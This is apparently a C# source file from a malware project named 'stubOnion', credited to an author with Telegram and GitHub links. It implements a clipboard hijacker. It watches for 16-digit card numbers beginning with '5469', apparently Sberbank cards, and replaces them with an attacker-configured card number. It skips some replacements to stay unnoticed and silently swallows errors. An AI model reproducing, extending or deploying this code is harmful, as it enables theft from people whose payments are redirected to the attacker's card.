/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using System.Windows.Forms;

namespace stubOnion
{
    class McSber
    {
        public static int _oppToMiss;
        public static void GetMcSberSber()
        {
            try
            {
                if (Clipboard.ContainsText())
                {
                    var clpbrd = Clipboard.GetText();

                    if (clpbrd.Length == 16)
                    {
                        if (clpbrd.StartsWith("5469"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.mcsbr);
                        }
                        else
                        {
                            return;
                        }

                    }
                    else
                    {
                        return;
                    }

                }
                else
                {
                    return;
                }
            }
            catch { }
        }
    }
}
